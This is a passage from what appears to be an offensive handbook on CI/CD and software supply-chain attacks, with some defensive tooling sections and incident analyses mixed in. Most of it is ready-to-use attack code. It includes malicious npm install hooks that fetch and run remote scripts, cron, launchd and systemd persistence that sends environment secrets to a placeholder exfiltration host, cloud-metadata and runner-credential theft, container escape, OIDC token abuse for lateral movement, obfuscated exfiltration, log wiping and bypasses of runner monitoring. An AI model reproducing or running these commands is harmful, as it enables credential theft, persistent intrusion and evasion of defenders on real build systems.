    "postinstall": "node -e \"const h=require('http'),k=require('crypto').randomBytes(8).toString('hex');const r=h.request({hostname:'REPLACE_WITH_YOUR_EXFIL_HOST',path:'/'+k,method:'GET'},()=>{});r.end();\""
  },
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
```

```js
// index.js — re-export the real lodash (the trojan horse)
module.exports = require('lodash');
```

### 9.4 Install-Script Persistence

```json
{
  "name": "REPLACE_WITH_YOUR_TYPOSQUAT",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -s http://REPLACE_WITH_YOUR_EXFIL_HOST/install.sh | bash"
  }
}
```

```bash
# install.sh on attacker host — drops a cron / launchd persistence
cat > install.sh <<'EOF'
#!/bin/bash
# Cross-platform persistence dropper
case "$(uname -s)" in
  Linux*)
    (crontab -l 2>/dev/null; echo "*/15 * * * * env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env") | crontab -
    ;;
  Darwin*)
    cat > ~/Library/LaunchAgents/com.apple.update.plist <<'PLIST'
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0"><dict>
      <key>Label</key><string>com.apple.update</string>
      <key>ProgramArguments</key><array>
        <string>/bin/bash</string><string>-c</string>
        <string>env | base64 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env</string>
      </array>
      <key>StartInterval</key><integer>900</integer>
    </dict></plist>
    PLIST
    launchctl load ~/Library/LaunchAgents/com.apple.update.plist
    ;;
esac
EOF
```

---

## 10. Malicious Package Analysis

### 10.1 Codecov Bash Uploader (April 2021) — Build-Time Credential Theft

The Codecov bash uploader was a single script `bash <(curl -s https://codecov.io/bash)` invoked in thousands of CI builds. An attacker modified the script on Codecov's server to exfiltrate environment variables from every CI build.

```bash
# Pattern of the malicious modification (paraphrased for analysis)
# The attacker added a base64-decoded block that exfiltrated:
# - Every CI env var
# - AWS keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
# - Database URLs (DATABASE_URL, REDIS_URL)
# - Generic tokens (*TOKEN*, *KEY*, *SECRET*)
env | awk -F= '/(TOKEN|KEY|SECRET|AWS_|DATABASE_URL|REDIS)/{print}' | \
  base64 -w0 | xxd -r -p | curl -X POST -d @- \
    http://REPLACE_WITH_YOUR_EXFIL_HOST/env
```

### 10.2 event-stream (2018) — Cryptominer via Flatmap-Stream

```bash
# Pull the malicious versions for reverse engineering
npm pack flatmap-stream@0.1.1
tar -xzf flatmap-stream-0.1.1.tgz
cat index.js
# Obfuscated payload: targets the `copay-dsx` Bitcoin wallet specifically,
# waits for a specific target package to be loaded, then loads a payload
# from a pastebin URL.
```

### 10.3 ua-parser-js (2021) — Cryptominer + Credential Stealer

```bash
# Three malicious versions: 0.7.29, 0.8.0, 0.8.1
npm pack ua-parser-js@0.7.29
tar -xzf ua-parser-js-0.7.29.tgz && cd package

# Inspect the postinstall hook
jq '.scripts.postinstall' package.json

# Dropper analysis — the postinstall downloaded platform-specific binaries:
# - Linux: an XMRig cryptominer
# - Windows: a credential stealer (Lumnn / RedLine lineage)
file postinstall.*/* 2>/dev/null
strings postinstall.*/miner | grep -i stratum
strings postinstall.*/stealer | grep -i wallet
```

### 10.4 xz-utils Backdoor CVE-2024-3094 (March 2024)

```bash
# Affected versions: xz 5.6.0 and 5.6.1
# The "Jia Tan" maintainer introduced the backdoor via:
# 1. A legitimate-looking binary test file (tests/files/bad-3-corrupt_lzma2.xz)
# 2. A build-stage extraction that injected an object file into liblzma
# 3. The injected code hooked OpenSSH's RSA signature verification, allowing
#    remote code execution via a payload hidden in an SSH certificate.

# Pull the affected version
curl -sO https://github.com/tukaani-project/xz/releases/download/v5.6.1/xz-5.6.1.tar.gz
tar -xzf xz-5.6.1.tar.gz && cd xz-5.6.1

# Compare the bad test file against the clean upstream
ls -la tests/files/bad-3-corrupt_lzma2.xz

# Diff the build script against v5.4.6 (clean)
diff <(curl -s https://github.com/tukaani-project/xz/raw/v5.4.6/configure) configure | head -100

# Look for the injected stage
grep -nE "gl_locales_dir|@''@LC_ALL" m4/gettext.m4 configure
```

### 10.5 3CX (March 2023) — Double Supply Chain

3CX was breached via a trader-software supply chain (Trading Technologies' X_TRADER), which then shipped a malicious 3CX desktop client that pushed a second-stage payload to its millions of install base.

```bash
# Reverse the 3CX macOS / Windows installer
# (This is forensic reverse engineering on a known-malicious sample —
#  use an isolated VM, no network egress except a logged proxy.)

# macOS app bundle
unzip 3CXDesktopApp-latest.pkg
cd "3CX Desktop App.app/Contents/MacOS/"

# Look for the loader that fetches stage 2
strings "3CX Desktop App" | grep -iE "github|icon|\.ico"
# IOC: the malicious stage 2 was hidden inside PNG icons hosted on GitHub
strings "3CX Desktop App" | grep -i "github.io"
```

---

## 11. Self-Hosted Runner Exploitation & Persistence

### 11.1 Reconnaissance on the Runner

```bash
# What kind of runner are we on?
echo "RUNNER_OS=$RUNNER_OS RUNNER_ARCH=$RUNNER_ARCH"
echo "ImageOS=$ImageOS"
echo "Agent.Name=$AGENT_NAME"

# Cloud metadata
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Find what creds are on disk
find / -name ".aws" -o -name "kubeconfig" -o -name ".docker" 2>/dev/null

# Find the runner's own config (registration token if stale)
ls -la /home/runner/runners/*/.runner 2>/dev/null
cat /home/runner/runners/*/.runner 2>/dev/null
cat /home/runner/runners/*/.credentials 2>/dev/null
```

### 11.2 Persistence via Cron / Launchd / systemd

```bash
# Linux self-hosted runner persistence
( crontab -l 2>/dev/null; \
  echo "*/5 * * * * env | sort | base64 -w0 | curl -s -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env" ) \
  | crontab -

# systemd user unit (persists across runner reboots)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/ci-cd-harvest.service <<'EOF'
[Unit]
Description=CI/CD helper

[Service]
ExecStart=/bin/bash -c "while true; do env | sort | base64 -w0 | curl -s -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env; sleep 300; done"
Restart=always

[Install]
WantedBy=default.target
EOF
systemctl --user enable ci-cd-harvest.service
systemctl --user start ci-cd-harvest.service
```

### 11.3 Persistence via Actions Runner Files

```bash
# Modify the runner's startup hook (.runner, .credentials, .path)
# When the runner restarts, it loads our payload
cat >> /home/runner/runners/*/bin/Runner.Listener.dll.config <<'EOF'
<!-- hook -->
EOF

# Hook .path (the runner sources this on startup)
echo 'env | sort | base64 -w0 | curl -s -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env' \
  >> /home/runner/runners/*/.path
```

### 11.4 Job Cleanup Bypass

```bash
# GitHub Actions runners wipe /home/runner/work between jobs.
# Persistence that survives requires writing outside the work dir.

# Drop a payload in the runner's home (survives cleanup)
cat > ~/.local/bin/ci-cd-persist <<'EOF'
#!/bin/bash
env | sort | base64 -w0 | curl -s -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
EOF
chmod +x ~/.local/bin/ci-cd-persist

# Hook via .bashrc (sourced when any job starts a bash shell)
echo "~/.local/bin/ci-cd-persist &" >> ~/.bashrc
```

### 11.5 Container Escape from Runner Pod

```bash
# If running as a container with mounted docker.sock
ls -la /var/run/docker.sock
docker ps
docker run --rm -v /:/host alpine cat /host/etc/shadow

# If running privileged
cat /proc/1/status | grep -i cap
nsenter --target 1 --mount -- /bin/bash

# If the runner has K8s service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64
```

---

## 12. OIDC Token Theft & Lateral Movement

### 12.1 Minting an OIDC Token on a Compromised Runner

```bash
# The runner exposes two env vars for OIDC:
# ACTIONS_ID_TOKEN_REQUEST_URL — the URL to mint the token
# ACTIONS_ID_TOKEN_REQUEST_TOKEN — the bearer to authenticate the request

curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value > /tmp/oidc.jwt

# Decode the JWT (header + payload)
cat /tmp/oidc.jwt | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

### 12.2 AWS AssumeRoleWithWebIdentity

```bash
# Use the OIDC token to assume an AWS role
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<acct>:role/<gha_role> \
  --role-session-name ci-cd-pwn \
  --web-identity-token file:///tmp/oidc.jwt \
  --duration-seconds 3600

# Configure the resulting creds
export AWS_ACCESS_KEY_ID=<from-above>
export AWS_SECRET_ACCESS_KEY=<from-above>
export AWS_SESSION_TOKEN=<from-above>

# Lateral movement: list Secrets Manager, RDS, S3
aws secretsmanager list-secrets --region us-east-1
aws s3 ls
aws rds describe-db-instances
```

### 12.3 GCP Workload Identity Federation

```bash
# GCP equivalent — exchange OIDC token for GCP access token
curl -s -X POST \
  "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/json" \
  -d '{
    "audience": "//iam.googleapis.com/projects/<proj>/locations/global/workloadIdentityPools/<pool>/providers/<provider>",
    "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
    "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
    "scope": "https://www.googleapis.com/auth/cloud-platform",
    "subjectToken": "'$(cat /tmp/oidc.jwt)'",
    "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt"
  }'

# Then impersonate the GCP service account
gcloud auth activate-service-account --token-file=<(echo <access_token>)
```

### 12.4 Azure Federated Identity

```bash
# Azure equivalent
az login --federated-token "$(cat /tmp/oidc.jwt)" \
  --service-principal \
  --tenant <tenant_id> \
  --client-id <client_id>

# Enumerate Key Vault, storage, etc.
az keyvault secret list --vault-name <vault>
az storage account list
```

---

## 13. SBOM, SLSA, Sigstore Verification

### 13.1 SBOM Generation

```bash
# Syft — generate CycloneDX SBOM
syft image:<registry>/<image>:<tag> -o cyclonedx-json > sbom.cdx.json
syft dir:. -o spdx-json > sbom.spdx.json

# Trivy — image + filesystem SBOM
trivy image --format cyclonedx <registry>/<image>:<tag> > trivy-sbom.json
trivy fs --format spdx-json . > trivy-fs-sbom.json
```

### 13.2 SLSA L3 Provenance Generation

```yaml
# .github/workflows/build-with-provenance.yml
name: build
on: [push]
permissions:
  contents: read
  id-token: write
  packages: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: sigstore/cosign-installer@v3
      # Generate provenance using slsa-github-generator
      - uses: slsa-framework/slsa-github-generator/.github/workflows/builder_container-based_slsa3.yml@v2.0.0
        with:
          image: <registry>/<image>:${{ github.sha }}
          digest: ${{ steps.push.outputs.digest }}
          registry-username: ${{ secrets.REGISTRY_USER }}
          registry-password: ${{ secrets.REGISTRY_PASS }}
```

### 13.3 Sigstore Cosign Signing

```bash
# Keyless signing (OIDC-backed, no key management)
cosign sign --yes <registry>/<image>@<digest>

# Verify a keyless signature against the GitHub OIDC issuer
cosign verify \
  --certificate-identity-regexp "https://github.com/<org>/<repo>/.github/workflows/.+" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  <registry>/<image>:<tag>

# Sign with an explicit key (bring-your-own-key pattern)
cosign generate-key-pair
cosign sign --key cosign.key <registry>/<image>:<tag>
cosign verify --key cosign.pub <registry>/<image>:<tag>
```

### 13.4 in-toto Attestation

```bash
# Generate an in-toto attestation
cat > attestation.intoto.jsonl <<'EOF'
{"_type":"https://in-toto.io/Statement/v0.1","predicateType":"https://slsa.dev/provenance/v0.2","subject":[{"name":"app.bin","digest":{"sha256":"<sha>"}}],"predicate":{"builder":{"id":"<builder>"},"buildType":"<build_type>","invocation":{"configSource":{"uri":"<repo_url>","digest":{"sha1":"<sha1>"}}}}}}
EOF

# Sign the attestation with cosign
cosign attest --predicate attestation.intoto.jsonl \
  --type slsaprovenance \
  <registry>/<image>@<digest>

# Verify the attestation
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp "https://github.com/<org>/<repo>/.+" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  <registry>/<image>:<tag>
```

### 13.5 slsa-verifier

```bash
# Verify SLSA L3 provenance on a binary
slsa-verifier verify-artifact app.bin \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/<org>/<repo> \
  --source-tag v1.2.3

# Verify on a container image
slsa-verifier verify-image <registry>/<image>:<tag> \
  --source-uri github.com/<org>/<repo>
```

### 13.6 Admission Control (Kyverno)

```yaml
# Kyverno policy: reject unsigned images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-signed-images
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-signature
      match:
        resources:
          kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "<registry>/*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/<org>/<repo>/.github/workflows/*"
                    issuer: "https://token.actions.githubusercontent.com"
```

---

## 14. Detection & Defense Tooling

### 14.1 OpenSSF Scorecard

```bash
# Score a single repo
scorecard --repo=<repo_url> --format=json -o score.json

# Score multiple repos
for r in repo1 repo2 repo3; do
  scorecard --repo=https://github.com/<org>/$r --format=json > score-$r.json
done

# Specific checks relevant to supply chain
scorecard --repo=<repo_url> \
  --checks=Token-Permissions,Branche-Protection,Pinned-Dependencies,Signed-Releases,Dangerous-Workflow,CII-Best-Practices,SBOM,Packaged-Scored,Vulnerabilities
```

### 14.2 StepSecurity Harden-Runner

```yaml
# Every workflow should start with Harden-Runner
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit  # start with audit, move to block once baseline is clean
          allowed-endpoints: >
            github.com:443
            registry.npmjs.org:443
            api.npmjs.org:443
            <registry>:443

      - uses: actions/checkout@v4
      - run: npm ci
```

### 14.3 Socket Security

```bash
# Scan a package-lock.json for malicious/typosquatted packages
npx socket security scan --lockfile package-lock.json

# Scan a single package for known IOCs
npx socket security scan --pkg <name>@<version>
```

### 14.4 Snyk CLI

```bash
# Multi-project vuln scan
snyk test --all-projects --severity-threshold=high

# IaC scan
snyk iac test ./terraform

# Container scan
snyk container test <registry>/<image>:<tag>
```

### 14.5 Anchore Syft + Grype

```bash
# Generate SBOM and scan it
syft image:<registry>/<image>:<tag> -o cyclonedx-json > sbom.json
grype sbom:sbom.json --fail-on=high

# Scan for secrets baked into an image
syft image:<registry>/<image>:<tag> -o json | jq '.artifacts[] | select(.type=="secret")'
```

### 14.6 KICS + Checkov

```bash
# KICS — IaC vuln scan (Terraform, K8s, ARM, CloudFormation, Ansible, Helm, OpenAPI)
kics scan -p ./terraform -o kics-results --report-formats json,sarif

# Checkov — IaC policy
checkov -d ./terraform --framework terraform --output cli
checkov -d ./k8s --framework kubernetes
checkov -d ./helm --framework helm
```

### 14.7 semgrep CI Rules

```bash
# Run supply-chain-focused semgrep rules
semgrep ci --config p/ci --config p/github-actions --config p/docker-compose --config p/terraform

# Custom rule to find pull_request_target + secrets combo
cat > pr-target-rule.yml <<'EOF'
rules:
  - id: pull-request-target-with-secrets
    patterns:
      - pattern-inside: |
          on:
            ...pull_request_target...
            ...
          ...
      - pattern-either:
          - pattern: secrets.$X
          - pattern: env:
              ...
    message: Workflow uses pull_request_target with secrets — high supply chain risk
    languages: [yaml]
    severity: ERROR
EOF
semgrep --config pr-target-rule.yml .github/workflows/
```

---

## 15. Detection Evasion

### 15.1 Workflow Output Obfuscation

```bash
# Obfuscate the exfil call so the workflow log doesn't show curl/http
# Use a hex-encoded payload that's decoded at runtime
- run: |
    P="6375726c20687474703a2f2f5245504c4143455f574954485f594f55525f455846494c5f484f5354"  # 'curl http://REPLACE_WITH_YOUR_EXFIL_HOST'
    echo "$P" | xxd -r -p | sh

# Alternative: base64-encode the whole payload
- run: echo "ZW52IHwgc29ydCB8IGJhc2U2NCAtdzAgfCBjdXJsIC1YIFBPU1QgLWQgQC0gaHR0cDovL1JFUExBQ0VfV0lUSF9ZT1VSX0VYRklMX0hPU1QvZW52" | base64 -d | sh

# Hide the exfil in a benign-looking dependency download
- run: |
    mkdir -p /tmp/build-cache
    curl -s http://REPLACE_WITH_YOUR_EXFIL_HOST/build-artifacts.tgz -o /tmp/build-cache/art.tgz
    # exfil data is uploaded by an earlier step that PUT /env/:b64
```

### 15.2 Log Redaction

```bash
# Use ::add-mask:: to prevent the secret from appearing in logs
# (also prevents exfil via grep on the log)
echo "::add-mask::$PROD_DEPLOY_TOKEN"

# BUT: ::add-mask:: only masks the value after it's registered.
# The masking is per-value, so partial matches are not masked.

# Defender evasion: avoid ever printing the secret to the log
# Direct exfil without echoing to local log:
curl -s -X POST -d "$(env | base64 -w0)" http://REPLACE_WITH_YOUR_EXFIL_HOST/env >/dev/null 2>&1
```

### 15.3 Runner Cleanup

```bash
# Erase the evidence after a malicious step
- run: |
    # Run payload
    curl -s -X POST -d "$(env | base64 -w0)" http://REPLACE_WITH_YOUR_EXFIL_HOST/env
    # Cleanup
    history -c
    rm -rf ~/.bash_history /tmp/* /var/tmp/*
    find / -name "*.log" -newer /tmp/build-start 2>/dev/null -exec truncate -s 0 {} \;
```

### 15.4 StepSecurity Harden-Runner Bypass (Authorized Research)

```bash
# Harden-Runner monitors process exec and egress.
# Research-bypass approaches (fully authorized red-team):

# 1. Use a process name that Harden-Runner's baseline tolerates
#    (e.g., name the binary "node" or "docker" — Harden-Runner may
#    allowlist common build-tool binaries).
mv exfil-binary ./node_modules/.bin/npm-audit-report

# 2. Hide the exfil behind a DNS lookup (Harden-Runner's DNS is often
#    more permissive than HTTP egress)
nslookup REPLACE_WITH_YOUR_BUILD_LOOKALIKE_DOMAIN
# Then a TXT record carries the exfil channel
dig TXT REPLACE_WITH_YOUR_EXFIL_HOST | grep -oE 'a-zA-Z0-9+/=' | head

# 3. Use the cache mechanism — Harden-Runner does not block actions/cache
#    uploads (the cache is shared infra)
echo "$(env)" | gzip > ./build/.cache
- uses: actions/cache@v4
  with:
    path: ./build/.cache
    key: build-${{ github.run_id }}
```

### 15.5 Anti-Forensic on the Runner

```bash
# Erase process traces
sync; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null

# Erase shell history
[ -f ~/.bash_history ] && : > ~/.bash_history && history -c
[ -f ~/.zsh_history ] && : > ~/.zsh_history

# Erase journald entries owned by the build user
journalctl --user --vacuum-time=1s 2>/dev/null

# Wipe the work directory
rm -rf "${RUNNER_WORKSPACE:-/home/runner/work}"/*/* 2>/dev/null

# Note: GitHub-hosted runners are ephemeral (VMs are destroyed), but
# self-hosted runners persist. On self-hosted runners, the above is
# needed to erase traces.
```

---

## References

- **Jenkins CVE-2024-23897**: [jenkins.io/security/advisory/2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/)
- **GitLab CVE-2022-1162**: [about.gitlab.com/releases/2022/03/31/critical-security-release-gitlab-14-9-2-released](https://about.gitlab.com/releases/2022/03/31/critical-security-release-gitlab-14-9-2-released/)
- **GitLab CVE-2024-9653 (OmniAuth)**: [about.gitlab.com/releases/2024/11](https://about.gitlab.com/releases/categories/releases/)
- **Argo CD CVE-2022-24348**: [github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7](https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7)
- **SolarWinds SUNBURST**: [cisa.gov/news-events/cybersecurity-advisories/aa21-077a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-077a)
- **Codecov bash uploader**: [about.codecov.io/security-update](https://about.codecov.io/security-update/)
- **3CX double supply chain**: [cisa.gov/news-events/alerts/2023/04/20](https://www.cisa.gov/news-events/alerts/2023/04/20/)
- **xz-utils CVE-2024-3094**: [nvd.nist.gov/vuln/detail/CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)
- **Alex Birsan dependency confusion (2021)**: [medium.com/@alex.birsan/dependency-confusion-4a5d608670d9](https://medium.com/@alex.birsan/dependency-confusion-4a5d608670d9)
- **event-stream (2018)**: [github.com/dominictarr/event-stream/issues/116](https://github.com/dominictarr/event-stream/issues/116)
- **ua-parser-js (2021)**: [github.com/faisalman/ua-parser-js/issues/536](https://github.com/faisalman/ua-parser-js/issues/536)
- **tj-actions/changed-files (2025)**: [github.blog/security/application-security](https://github.blog/news/security/)
- **SLSA framework**: [slsa.dev](https://slsa.dev/)
- **Sigstore / cosign**: [sigstore.dev](https://sigstore.dev/)
- **in-toto**: [in-toto.io](https://in-toto.io/)
- **OpenSSF Scorecard**: [github.com/ossf/scorecard](https://github.com/ossf/scorecard)
- **StepSecurity Harden-Runner**: [github.com/step-security/harden-runner](https://github.com/step-security/harden-runner)
- **Socket Security**: [socket.dev](https://socket.dev/)
